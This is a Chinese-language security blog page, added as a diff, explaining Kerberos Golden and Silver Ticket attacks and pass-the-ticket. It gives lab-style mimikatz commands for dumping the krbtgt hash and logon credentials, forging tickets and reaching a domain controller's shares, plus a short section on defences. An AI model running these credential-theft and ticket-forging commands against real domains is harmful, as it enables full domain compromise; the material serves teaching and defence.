@@ -1,0 +1,1377 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="票据," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="浅析黄金票据与白银票据前言​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。 概念我们首先需要学习关于kerberos认证  KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS AS(Authentication S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析黄金票据与白银票据">
+<meta property="og:url" content="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/index.html">
+<meta property="og:site_name" content="Shu1L&#39;s blog">
+<meta property="og:description" content="浅析黄金票据与白银票据前言​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。 概念我们首先需要学习关于kerberos认证  KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS AS(Authentication S">
+<meta property="og:image" content="https://wooyun.js.org/images_result/images/2016011804523676070160.png">
+<meta property="og:image" content="c:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542295163.png">
+<meta property="og:image" content="c:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543225966.png">
+<meta property="og:image" content="c:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542805439.png">
+<meta property="og:image" content="c:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543260644.png">
+<meta property="og:image" content="https://images2017.cnblogs.com/blog/1049983/201712/1049983-20171227215506456-245748150.png">
+<meta property="og:image" content="https://wooyun.js.org/images_result/images/20160118045254154911118.png">
+<meta property="og:image" content="https://wooyun.js.org/images_result/images/20160118045256924591213.png">
+<meta property="article:published_time" content="2020-06-06T00:31:56.000Z">
+<meta property="article:modified_time" content="2020-06-06T02:31:26.945Z">
+<meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="票据">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wooyun.js.org/images_result/images/2016011804523676070160.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/"/>
+
+
+
+
+
+  <title>浅析黄金票据与白银票据 | Shu1L's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shu1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一只菜鸟白帽子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shu1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">浅析黄金票据与白银票据</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-06T08:31:56+08:00">
+                2020-06-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">域渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p>
+<h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p>
+<ul>
+<li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li>
+<li><strong>AS</strong>(Authentication Server)： 身份认证服务</li>
+<li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li>
+<li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li>
+<li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li>
+</ul>
+<h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
+<p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p>
+<p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>
+<p><img src="https://wooyun.js.org/images_result/images/2016011804523676070160.png" alt="Alt text"></p>
+<h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul>
+<li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li>
+<li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li>
+<li>该<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li>
+<li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li>
+<li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451" target="_blank" rel="noopener">通常从域控制器转储</a>）。</li>
+<li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li>
+<li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li>
+<li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li>
+</ul>
+<h5 id="制作金票的条件："><a href="#制作金票的条件：" class="headerlink" title="制作金票的条件："></a>制作金票的条件：</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称            </span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账户密码HASH</span><br><span class="line"><span class="number">4</span>、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure>
+
+<p>实战中，通常使用Mimikatz来提取krbtgt的NTLM-Hash。</p>
+<p>1.获取域名称</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">view</span> /<span class="built_in">domain</span></span><br></pre></td></tr></table></figure>
+
+<p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /domain:test666.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure>
+
+<p>3..Mimikatz生成黄金票据</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test666.com /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1497092113</span><span class="string">-2272191533</span><span class="string">-193330055</span> /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤:"></a>利用步骤:</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>命令获取krbtgt的值。</p>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542295163.png" alt=""></p>
+<h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<p>参数说明：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543225966.png" alt=""></p>
+<h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542805439.png" alt=""></p>
+<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543260644.png" alt=""></p>
+<p><strong>TIPS:</strong></p>
+<p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p>
+<p><img src="https://images2017.cnblogs.com/blog/1049983/201712/1049983-20171227215506456-245748150.png" alt="img"></p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
+<li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li>
+<li>可以伪造任意用户，即使其不存在。</li>
+<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li>
+</ul>
+<h4 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h4><ul>
+<li><strong>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组</strong>。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li>
+<li><strong>禁用KRBTGT帐户，并保存当前的密码以及以前的密码</strong>。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li>
+</ul>
+<h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
+<p><strong>正确的认证流程:</strong></p>
+<p><img src="https://wooyun.js.org/images_result/images/20160118045254154911118.png" alt="Alt text"></p>
+<p><strong>使用了Silver Ticke的认证流程:</strong></p>
+<p><img src="https://wooyun.js.org/images_result/images/20160118045256924591213.png" alt="Alt text"></p>
+<h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul>
+<li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
+<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
+<li>攻击者需要服务帐户密码哈希值</li>
+<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li>
+<li>任何事件日志都在目标服务器上。</li>
+</ul>
+<p><strong>制作银票的条件：</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域中的Server服务器账户的NTLM-Hash</span><br><span class="line"><span class="number">4.</span>伪造的用户名，可以是任意用户名.</span><br><span class="line"><span class="number">5.</span>目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure>
+
+<p><strong>白银票据的服务列表</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote<span class="built_in"> Server </span>   RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>  首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">privilege</span><span class="selector-pseudo">::debug"</span> "<span class="selector-tag">sekurlsa</span><span class="selector-pseudo">::logonpasswords"</span> "<span class="selector-tag">exit</span>" &gt; 1<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566649973247.png)</p>
+<h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p>
+<p>参数说明：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure>
+
+<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654188946.png)</p>
+<p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p>
+<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654225879.png)</p>
+<p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p>
+<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654265383.png)</p>
+<h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table>
+<thead>
+<tr>
+<th>Service Type</th>
+<th>Service Silver Tickets</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations includingMimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS LDAP CIFS</td>
+</tr>
+</tbody></table>
+<h5 id="Windows共享（CIFS）管理访问的银票"><a href="#Windows共享（CIFS）管理访问的银票" class="headerlink" title="Windows共享（CIFS）管理访问的银票"></a>Windows共享（CIFS）管理访问的银票</h5><p>为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</p>
+<p>注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</p>
+<p>c $共享，我们能够将文件拷贝到共享文件中。</p>
+<h5 id="具有管理员权限的Windows计算机（HOST）白银票据"><a href="#具有管理员权限的Windows计算机（HOST）白银票据" class="headerlink" title="具有管理员权限的Windows计算机（HOST）白银票据"></a>具有管理员权限的Windows计算机（HOST）白银票据</h5><p>创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</p>
+<h5 id="Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><a href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行" class="headerlink" title="Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"></a>Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</h5><p>为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</p>
+<p>注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p>
+<h5 id="白银票据证连接到具有管理员权限Windows计算机上的LDAP"><a href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的LDAP"></a>白银票据证连接到具有管理员权限Windows计算机上的LDAP</h5><p>为“ldap”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</p>
+<p>利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</p>
+<p><strong>注：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br></pre></td></tr></table></figure>
+
+<p>​    向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</p>
